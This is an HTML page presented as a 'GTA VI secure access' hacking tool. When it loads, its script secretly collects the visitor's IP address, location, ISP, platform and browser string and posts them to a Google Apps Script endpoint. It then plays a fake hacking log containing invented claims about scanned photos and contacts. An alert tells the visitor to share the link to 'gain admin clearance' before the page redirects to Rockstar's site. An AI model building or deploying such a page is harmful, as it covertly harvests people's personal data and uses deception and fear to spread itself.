<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GTA VI SECURE ACCESS</title>

<style>
body {
  margin: 0;
  background: #000;
  color: #00ff9f;
  font-family: monospace;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
}

.container {
  width: 90%;
  max-width: 500px;
  border: 2px solid #00ff9f;
  padding: 20px;
}

h1 {
  color: #ff0033;
  text-align: center;
  animation: glitch 1s infinite;
}

@keyframes glitch {
  0% {opacity: 1;}
  50% {opacity: 0.7;}
  100% {opacity: 1;}
}

.terminal {
  font-size: 12px;
  height: 150px;
  overflow-y: auto;
  background: #000;
  margin-top: 10px;
}

.progress {
  width: 100%;
  height: 15px;
  background: #222;
  margin-top: 10px;
}

.bar {
  width: 0%;
  height: 100%;
  background: #00ff9f;
}

button {
  width: 100%;
  padding: 10px;
  margin-top: 10px;
  background: #ff0033;
  color: white;
  border: none;
  font-weight: bold;
}

.info {
  font-size: 12px;
  margin-top: 10px;
}
</style>
</head>

<body>

<div class="container">
  <h1>SECURITY BREACH</h1>

  <div class="info" id="info">Fetching system identity...</div>

  <div class="terminal" id="terminal"></div>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <button onclick="startHack()">AUTHENTICATE UPLINK</button>
</div>

<script>

// ===== FETCH USER DATA =====
let userData = {};

async function getUserData() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    userData = {
      ip: data.ip,
      city: data.city,
      country: data.country_name,
      isp: data.org,
      device: navigator.platform,
      browser: navigator.userAgent
    };

    document.getElementById("info").innerText =
      `IP: ${data.ip} | ${data.city}, ${data.country_name}`;

    trackUser(); // send to sheet

  } catch {}
}

// ===== TRACK USER (GOOGLE SHEETS) =====
async function trackUser() {
  try {
    await fetch("https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec", {
      method: "POST",
      body: JSON.stringify(userData)
    });
  } catch {}
}

// ===== TERMINAL LOG =====
function log(text) {
  let terminal = document.getElementById("terminal");
  terminal.innerHTML += text + "<br>";
  terminal.scrollTop = terminal.scrollHeight;
}

// ===== MAIN SEQUENCE =====
function startHack() {
  let logs = [
    "Connecting to Rockstar servers...",
    "Bypassing firewall...",
    "Decrypting GTA VI assets...",
    "Tracking IP: " + userData.ip,
    "Accessing device: " + userData.device,
    "Scanning files...",
    "Photos detected: 124",
    "Contacts synced: 58",
    "Injecting access token..."
  ];

  let i = 0;
  let bar = document.getElementById("bar");

  let interval = setInterval(() => {
    if (i < logs.length) {
      log(logs[i]);
      i++;
      bar.style.width = (i / logs.length) * 100 + "%";
    } else {
      clearInterval(interval);
      triggerShare();
    }
  }, 1000);
}

// ===== SHARE TRIGGER =====
function triggerShare() {
  setTimeout(() => {
    alert("⚠ Unauthorized Access\nShare link to gain admin clearance");

    if (navigator.share) {
      navigator.share({
        title: "GTA VI Access",
        text: "Restricted GTA VI server access 😳",
        url: window.location.href
      });
    }

    redirect();
  }, 2000);
}

// ===== REDIRECT =====
function redirect() {
  setTimeout(() => {
    document.body.style.background = "white";
    setTimeout(() => {
      document.body.style.background = "black";
      window.location.href = "https://www.rockstargames.com/VI";
    }, 300);
  }, 1000);
}

// INIT
getUserData();

</script>

</body>
</html>
